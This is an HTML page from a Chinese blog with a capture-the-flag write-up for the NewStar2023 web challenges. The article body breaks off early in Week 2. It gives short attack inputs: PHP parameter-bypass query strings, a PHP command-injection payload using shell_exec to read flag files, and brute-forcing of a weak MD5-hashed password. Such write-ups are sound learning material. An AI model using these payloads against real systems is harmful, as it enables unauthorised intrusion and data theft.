<!DOCTYPE html>

<html lang="zh-CN">
    <head>
    <meta charset="utf-8">
    <!--
        hexo-theme-suka © SukkaW
        GitHub: https://github.com/SukkaW/hexo-theme-suka
    -->

    <!-- ### Resource Hint ### -->

    <!-- ## DNS Prefetch ## -->
    <meta http-equiv="x-dns-prefetch-control" content="on">

<!-- busuanzi -->


<!-- comment -->



    <link rel="dns-prefetch" href="//api.github.com">
    <link rel="dns-prefetch" href="//cors-anywhere.herokuapp.com">





<!-- analytics -->







    <!-- ## Preload ## -->
    




    <!-- ### Meta & Title & Info ### -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, minimum-scale=1, initial-scale=1, maximum-scale=5, viewport-fit=cover">
    <meta name="renderer" content="webkit">

    <!-- Title -->
    <title>NewStar2023 WEB WP | Z1d10tのBlog</title>

    <!-- Favicons -->
    <link rel="icon" type="image&#x2F;ico" href="/img/suka-favicon.ico">

    <!-- ### Import File ### -->
    <link rel="stylesheet" href="/lib/spectre/spectre.min.css"><style>
    body {
        background-color: #f8f9fa;
    }

    a, a:visited {
        color: #0070ff;
    }

    a:active, a:focus, a:hover {
        color: #0070ff;
        opacity: .75;
    }

    #post-content a,
    #post-content a:hover,
    #post-content a:focus,
    #post-content a:visited {
        color: #005eb9;
        opacity: 1;
    }

    

    .post-entry .card-body a {
        color: #0070ff;
    }

    .avatar {
        background: #444;
    }

    .navbar-link,
    .navbar-link:visited,
    .timeline .timeline-item .timeline-icon.icon-lg {
        color: #0070ff;
    }

    .navbar-link:hover {
        color: #0070ff;
        opacity: .8;
    }

    #search-input .btn,
    #disqus_click_btn,
    #disqus-switch-to-direct,
    #disqus-loadmore-button {
        background: #727e96;
        border-color: #727e96;
        color: #fff;
    }

    #post-toc a.post-toc-link,
    #post-toc a.post-toc-link:visited,
    .share-menu.menu .menu-item>a {
        color: #727e96;
    }

    .share-menu.menu .menu-item>a:hover,
    .share-menu.menu .menu-item>a:focus,
    .share-menu.menu .menu-item>a:visited {
        color: #50596c;
        background: #f8f9fa;
        opacity: .85;
    }
</style><link rel="stylesheet" href="/css/style.min.css">








    <!-- Prettify Theme -->
    
    <link rel="preload" href="/css/highlight/github.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="/css/highlight/github.min.css"></noscript>





<script>
/*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
!function(t){"use strict";t.loadCSS||(t.loadCSS=function(){});var e=loadCSS.relpreload={};if(e.support=function(){var e;try{e=t.document.createElement("link").relList.supports("preload")}catch(t){e=!1}return function(){return e}}(),e.bindMediaToggle=function(t){var e=t.media||"all";function a(){t.addEventListener?t.removeEventListener("load",a):t.attachEvent&&t.detachEvent("onload",a),t.setAttribute("onload",null),t.media=e}t.addEventListener?t.addEventListener("load",a):t.attachEvent&&t.attachEvent("onload",a),setTimeout(function(){t.rel="stylesheet",t.media="only x"}),setTimeout(a,3e3)},e.poly=function(){if(!e.support())for(var a=t.document.getElementsByTagName("link"),n=0;n<a.length;n++){var o=a[n];"preload"!==o.rel||"style"!==o.getAttribute("as")||o.getAttribute("data-loadcss")||(o.setAttribute("data-loadcss",!0),e.bindMediaToggle(o))}},!e.support()){e.poly();var a=t.setInterval(e.poly,500);t.addEventListener?t.addEventListener("load",function(){e.poly(),t.clearInterval(a)}):t.attachEvent&&t.attachEvent("onload",function(){e.poly(),t.clearInterval(a)})}"undefined"!=typeof exports?exports.loadCSS=loadCSS:t.loadCSS=loadCSS}("undefined"!=typeof global?global:this);
</script>

    <!-- ### Site Verification ### -->
    


    <meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Z1d10tのBlog"><meta name="msapplication-starturl" content="https://z1d10t.fun"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Z1d10tのBlog"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

    <!-- ### The Open Graph & Twitter Card Protocol ### -->
    <meta property="og:title" content="NewStar2023 WEB WP | Z1d10tのBlog"><meta property="og:site_name" content="Z1d10tのBlog"><meta property="og:type" content="article"><meta property="og:url" content="https://z1d10t.fun/post/dcc8a51b.html"><meta property="og:locale" content="zh-CN"><meta name="description" content="小阶段完成 - Z1d10t - Z1d10tのBlog"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695620310236-6bbb4213-7832-4c9e-9cb6-972e12f682a9.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695620090015-6e93ad0d-5ec6-45c3-bfb9-f7aee7d97337.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695617294020-eb01d6c9-c990-44a4-83a4-c33e9eb85046.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695616213122-0044da95-b172-405b-a1c9-c98cee6536c7.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695629472388-c783f834-6097-4b10-bd61-f366c4983399.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696172672213-98b769f1-a424-4a00-a451-3095c4137adb.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696171708476-0624b883-3c25-461c-8127-7f163a4bab2e.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696171733094-68be6a56-67e1-45ab-88fa-8df2ea9eb0ad.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697164131734-b78abbc2-ee62-4767-965e-11accdbf5e48.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697165693345-4172a348-e3bd-473c-b24a-303757cc3b1e.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697165707316-253cea3f-c08e-4f2d-b928-46805a4bceee.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166037980-4bb0dd83-1b97-4a6c-b1f6-c2c8566ddbab.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166058190-e47aa6de-380f-42ef-a2ce-f04c871166e3.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166758715-338c47b1-47e3-4ac6-9785-be333a06fc3c.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166888157-91644cb2-2103-49b6-b72c-2175670971f3.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167165409-d0be8833-d256-44c9-a712-ad8cedc046cd.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697274880739-9d9bc3d7-e83f-43d7-a46c-452764c272a1.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167312141-c99bbfb6-154d-4920-aad1-2d15c7586b7a.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167358763-2fd909df-fef3-4b62-bb20-85c359e4dfd3.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167409474-8c8f8358-af0f-44f2-8d83-ce6749dde650.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697642632042-0e857bfb-849f-4ca9-96eb-8ab35051a90b.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697642675212-31124284-5660-49f3-8ded-02d920345766.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697642947630-648bd479-d31a-42a1-a3db-e854baf8d485.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697988088416-7cd82ab6-f545-4824-8ccf-6e9813e9255a.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697988099715-8340a7be-7dd9-4926-9ba8-a0a6b2ab7fb6.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698479533782-f7d4c9e8-4bd6-4a96-b468-7e9225580e39.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481376316-6c17aacc-a517-4047-95f5-cd46b8a6a792.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481525990-8c6fad3d-f5c8-4968-afa3-4cfa7cf6d689.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481570952-e9ed3e3d-a994-4707-97f2-5fe5a50e12cf.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481643850-8aaf3276-06d0-4874-83c3-864ea8233ae4.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698481704911-05884a79-1873-4441-b306-6615bb8d8e1c.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698483592278-60ae86c4-b0cb-4206-8cf7-23eae59b1225.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698483692006-fad9b10a-ab71-43e3-b358-5586d7458a08.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698484036732-b9d7526a-ee26-4ba4-be46-a4cf5797e8c0.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698485116132-4b195cc5-160e-4156-be43-10df30b6fe65.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698485894959-0305c6d9-dc23-41b2-987e-74979132cf72.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698485737899-0a1ec05c-caea-4355-b599-bc7798a61086.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698486990058-e84113fd-3c61-496c-84d6-f1b3a796fc9d.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698838298382-580e4d6d-f28d-40e7-a0e4-00f6420608e6.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698564198569-1243af25-92dd-4cfc-916d-4750a52577a3.png"><meta property="article:published_time" content="2023-11-01T11:33:46.000Z"><meta property="article:modified_time" content="2023-11-05T14:31:22.719Z"><meta property="og:updated_time" content="2023-11-05T14:31:22.719Z"><meta property="article:author" content="Z1d10t"><meta name="twitter:card" content="summary">

    

    <!-- ### Canonical link ### -->
    <link rel="canonical" href="https://z1d10t.fun/post/dcc8a51b.html">

    <meta name="generator" content="Hexo 6.3.0">

    <!-- ### Analytics ### -->
    







    <!-- ### Structured Data ### -->
    



<script type="application/ld+json">
{
    "@context": "http://schema.org",
    "url": "https://z1d10t.fun/post/dcc8a51b.html",
    "@type": "BlogPosting",
    "logo": "https://z1d10t.fun/img/suka-favicon.ico",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "https://z1d10t.fun/post/dcc8a51b.html"
    },
    "headline": "NewStar2023 WEB WP | Z1d10tのBlog",
    
    "image": {
        "@type": "ImageObject",
        "url": "https://z1d10t.fun/img/suka-favicon.ico"
    },
    
    "datePublished": "2023-11-01T11:33:46.000Z",
    "dateModified": "2023-11-05T14:31:22.719Z",
    "author": {
        "@type": "Person",
        "name": "Z1d10t",
        "image": {
            "@type": "ImageObject",
            "url": "https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png"
        },
        "description": "“分享欲正在消逝”"
    },
    "publisher": {
        "@type": "Organization",
        "name": "Z1d10tのBlog",
        "logo": {
            "@type": "ImageObject",
            "url": "https://z1d10t.fun/img/suka-favicon.ico"
        }
    },
    
    "potentialAction": {
        "@type": "SearchAction",
        "target": "https://z1d10t.fun/search/?s={search_term_string}",
        "query-input": "required name=search_term_string"
    },
    
    "keywords": "",
    "description": "小阶段完成 - Z1d10t - Z1d10tのBlog"
}
</script>



    <!-- ### Custom Head ### -->
    
</head>

    <body>
            

            <!-- ### Main content ### -->
            <!-- ## Header ##-->
<header>
    <h1 class="header-title text-center"><a href="/">Z1d10tのBlog</a></h1>

    <p class="text-center header-slogan">
        
            
                “分享欲正在消逝”
            
        
    </p>

    <nav class="navbar-section text-center">
    
        <a href="/" class="navbar-link">Home</a>
    
    
        <a href="/archives/" class="navbar-link">Archives</a>
    
    
        <a href="/search/" class="navbar-link">Search</a>
    
    
        <a href="/about/" class="navbar-link">About</a>
    
        <a href="/links/" class="navbar-link">Friends</a>
    
    
    
</nav>
</header>

            
    <!-- ## Post ## -->
    <div class="post-container">
    <div id="post-card" class="card">
        
        <div class="card-item-container">
            <div class="card-inner-cell">
                <!-- # Post Header Info # -->
                <div class="card-header">
                    
    <h1 class="card-title h3 mb-2">NewStar2023 WEB WP</h1>




<div class="post-header-info">
    <p class="post-header-info-left text-gray">
        <img class="author-thumb lazyload" data-src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png" src="/img/suka-lazyload.gif" alt="Z1d10t's Avatar">
        <span>2023-11-01</span>
        
            <span class="suka-devide-dot"></span>
            <a class="category-link" href="/categories/%E5%90%84%E8%B5%9B%E4%BA%8BWP/">各赛事WP</a>
        
        
        
    </p>
    <div class="post-header-info-right">
        
            <div class="dropdown dropdown-right">
<a class="dropdown-toggle" tabindex="0">分享本文</a>
<ul class="menu share-menu">
    <!-- Share Weibo -->
    
    <li class="menu-item">
        <a href="http://service.weibo.com/share/share.php?appkey=&title=NewStar2023 WEB WP&url=https://z1d10t.fun/post/dcc8a51b.html&pic=https://z1d10t.fun/img/suka-favicon.ico&searchPic=false&style=simple" target="_blank" rel="external noopener noreferrer nofollow">分享到微博</a>
    </li>
    

    <!-- Share Twitter -->
    
    <li class="menu-item">
        <a href="https://twitter.com/intent/tweet?text=NewStar2023 WEB WP&url=https://z1d10t.fun/post/dcc8a51b.html&via=Z1d10t" target="_blank" rel="external noopener noreferrer nofollow">分享到 Twitter</a>
    </li>
    

    <!-- Share Facebook -->
    
    <li class="menu-item">
        <a href="https://www.facebook.com/sharer/sharer.php?u=https://z1d10t.fun/post/dcc8a51b.html" target="_blank" rel="external noopener noreferrer nofollow">分享到 Facebook</a>
    </li>
    

    <!-- Share Google+ -->
    
    <li class="menu-item">
        <a href="https://plus.google.com/share?url=https://z1d10t.fun/post/dcc8a51b.html" target="_blank" rel="external noopener noreferrer nofollow">分享到 Google+</a>
    </li>
    

    <!-- Share LinkedIn -->
    
    <li class="menu-item">
        <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://z1d10t.fun/post/dcc8a51b.html&title=Z1d10tのBlog" target="_blank" rel="external noopener noreferrer nofollow">分享到 LinkedIn</a>
    </li>
    

    <!-- Share QQ -->
    
    <li class="menu-item">
        <a href="http://connect.qq.com/widget/shareqq/index.html?site=Z1d10tのBlog&title=Z1d10tのBlog&summary=邪王真眼是最强的！&pics=https://z1d10t.fun/img/suka-favicon.ico&url=https://z1d10t.fun/post/dcc8a51b.html" target="_blank" rel="external noopener noreferrer nofollow"> 分享到 QQ</a>
    </li>
    

    <!-- Share Telegram -->
    
    <li class="menu-item">
        <a href="https://t.me/share/url?url=https://z1d10t.fun/post/dcc8a51b.html&text=Z1d10tのBlog" target="_blank" rel="external noopener noreferrer nofollow">分享到 Telegram</a>
    </li>
    

    <!-- QRCode -->
    
    <li class="menu-item">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIQAAACECAAAAAB0L9x7AAABjklEQVR42u3b0W7CMAxG4b7/S7OrSVNV2yesdH+m05uCgPBdmMSOw/EKuA4RIkRsgTia6/KDp9fOj7+fk3FF5CKqL+seV9ifr4/jiohGnAet7lWQVgFbjStib0QVpBVGxP9HdBNRtUCJ2B9RLTRXgdkO/IlVVMTjiC4h/c39tmxbxKOIsWgFi1NVGN1WlYt4FNEF0lQIT5PWVGCLyEWsLFbTQjcVTe2MKSIGQe7TgCQhQr8OERGI9o1VQjJsqnYLoIhsRBdUNMjoxivOrEREIGiAdsnv2wuYiCgESWq7hHickFYTXRERiGnwrvlWJcZkc15ELqILTtJ8JRMU+nWIiEG0bwRF8XSAo8SL2ApRgWjh222qidgDQYtccqhjatKJ2ANBD/KR5JckSCJyEaQRNxXE04brLc1ZEY8hUGN9GJgcFsPZtogIBG2w0WYsacyIyEeQAz1kYSNgEfsjpkN972zAitgf0QUgSXoukSKiEasN15UDgOjUgIgoBClkX/APiEs4EZGIv7xEiBARjfgC6xW5eVjqI/gAAAAASUVORK5CYII=" alt="QRCode">
    </li>
    

</ul>
</div>
        
    </div>
</div>
                </div>
                <div class="card-body">
                    
                        
                        
                            <div id="post-toc"><ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E5%89%8D%E8%A8%80"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEEK1"><span class="post-toc-number">2.</span> <span class="post-toc-text">WEEK1</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ErrorFlask"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">ErrorFlask</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Begin-of-HTTP"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">Begin of HTTP</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-number">3.</span> <span class="post-toc-text"></span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Begin-of-Upload"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">Begin of Upload</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%B3%84%E6%BC%8F%E7%9A%84%E7%A7%98%E5%AF%86"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">泄漏的秘密</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Begin-of-PHP"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">Begin of PHP</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#R-C-E"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">R!C!E!</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#EasyLogin"><span class="post-toc-number">3.5.</span> <span class="post-toc-text">EasyLogin</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEEK2"><span class="post-toc-number">4.</span> <span class="post-toc-text">WEEK2</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%B8%B8%E6%88%8F%E9%AB%98%E6%89%8B"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">游戏高手</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ez-sql"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">ez_sql</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Upload-again"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">Upload again!</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Unserialize%EF%BC%9F"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">Unserialize？</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#include-0%E3%80%820"><span class="post-toc-number">4.5.</span> <span class="post-toc-text">include 0。0</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#R-C-E-1"><span class="post-toc-number">4.6.</span> <span class="post-toc-text">R!!C!!E!!</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEEK3"><span class="post-toc-number">5.</span> <span class="post-toc-text">WEEK3</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#medium-sql"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">medium_sql</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Include"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">Include</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#POP-Gadget"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">POP Gadget</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#GenShin"><span class="post-toc-number">5.4.</span> <span class="post-toc-text">GenShin</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#R-C-E-2"><span class="post-toc-number">5.5.</span> <span class="post-toc-text">R!!!C!!!E!!!</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#OtenkiGirl"><span class="post-toc-number">5.6.</span> <span class="post-toc-text">OtenkiGirl</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEEK4"><span class="post-toc-number">6.</span> <span class="post-toc-text">WEEK4</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#More-Fast"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">More Fast</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E9%80%83"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">逃</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#flask-disk"><span class="post-toc-number">6.3.</span> <span class="post-toc-text">flask disk</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#PharOne"><span class="post-toc-number">6.4.</span> <span class="post-toc-text">PharOne</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#InjectMe"><span class="post-toc-number">6.5.</span> <span class="post-toc-text">InjectMe</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#midsql"><span class="post-toc-number">6.6.</span> <span class="post-toc-text">midsql</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#OtenkiBoy%EF%BC%88%E6%9C%AA%E8%A7%A3%E5%87%BA%EF%BC%89"><span class="post-toc-number">6.7.</span> <span class="post-toc-text">OtenkiBoy（未解出）</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEEK5"><span class="post-toc-number">7.</span> <span class="post-toc-text">WEEK5</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Unserialize-Again"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">Unserialize Again</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="post-toc-number">7.1.1.</span> <span class="post-toc-text">非预期</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="post-toc-number">7.1.2.</span> <span class="post-toc-text">预期解</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Final"><span class="post-toc-number">7.2.</span> <span class="post-toc-text">Final</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#pppython"><span class="post-toc-number">7.3.</span> <span class="post-toc-text">pppython?</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E5%BC%8F-%E8%84%9A%E6%9C%AC%E8%AE%A1%E7%AE%97"><span class="post-toc-number">7.3.1.</span> <span class="post-toc-text">第一种方式 脚本计算</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E5%BC%8Fgopher%E5%8F%91%E5%8C%85"><span class="post-toc-number">7.3.2.</span> <span class="post-toc-text">第二种方式gopher发包</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#NextDrive"><span class="post-toc-number">7.4.</span> <span class="post-toc-text">NextDrive</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#4-%E5%A4%8D%E7%9B%98-%E6%9C%AA%E8%A7%A3%E5%87%BA"><span class="post-toc-number">7.5.</span> <span class="post-toc-text">4-复盘(未解出)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Ye%E2%80%99s-Pickle%EF%BC%88%E6%9C%AA%E8%A7%A3%E5%87%BA"><span class="post-toc-number">7.6.</span> <span class="post-toc-text">Ye’s Pickle（未解出)</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E7%BB%93%E5%B0%BE"><span class="post-toc-number">8.</span> <span class="post-toc-text">结尾</span></a></li></ol></div>
                        
                    
                    <article id="post-content">
                        <p>小阶段完成</p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>经过五周的比赛，恭喜NewStar2023(校内赛道)圆满结束了 <em>★,°</em>:.☆(￣▽￣)&#x2F;$:<em>.°★</em> 。</p>
<p>这里是Z1d10t的WEB方向题解</p>
<p>3题未解出 还是太菜了qwq </p>
<p>日后会更加努力！</p>
<h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p>报错之后能看到是flask框架的 然后就能得到源码</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695620310236-6bbb4213-7832-4c9e-9cb6-972e12f682a9.png" alt="img"></p>
<h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p>正常考察请求头参数</p>
<h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695620090015-6e93ad0d-5ec6-45c3-bfb9-f7aee7d97337.png" alt="img"></h1><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p>前端检测绕过</p>
<h2 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h2><p>&#x2F;<a target="_blank" rel="noopener" href="http://www.zip源码泄露/">www.zip源码泄露</a></p>
<h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><p>get：<code>?key1[]=1&amp;key2[]=2&amp;key4[]=4&amp;key5=2024%00</code></p>
<p>post：<code>key3[]=3&amp;flag5[]=1</code></p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695617294020-eb01d6c9-c990-44a4-83a4-c33e9eb85046.png" alt="img"></p>
<h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=114514&amp;e[v.a.l=var_dump(shell_exec(&#x27;more /f*&#x27;));</span><br></pre></td></tr></table></figure>

<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695616213122-0044da95-b172-405b-a1c9-c98cee6536c7.png" alt="img"></p>
<h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><p>爆破的时候会获得一条一条的提示 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> The password is randomly selected <span class="keyword">from</span> a <span class="keyword">list</span></span><br><span class="line"></span><br><span class="line"> 这个密码恰如题目简介，一分不多，一分不少</span><br><span class="line"></span><br><span class="line">Is your password weak?</span><br></pre></td></tr></table></figure>

<p>一开始一直以为 <code>这个密码恰如题目简介，一分不多，一分不少</code>的意思是密码9位 但是之后和出题人聊了之后 和这个根本没关系 只想表达是弱口令密码 </p>
<p>密码是000000 当然记得要通过md5加密之后再爆破</p>
<p>登录然后放掉这个包 然后还会跳转到一个包 就能获得密码 </p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695629472388-c783f834-6097-4b10-bd61-f366c4983399.png" alt="img"></p>
<h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><h2 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h2><p>修改得分即可</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696172672213-98b769f1-a424-4a00-a451-3095c4137adb.png" alt="img"></p>
<h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>手动注个jb sqlmap一把梭就行了</p>
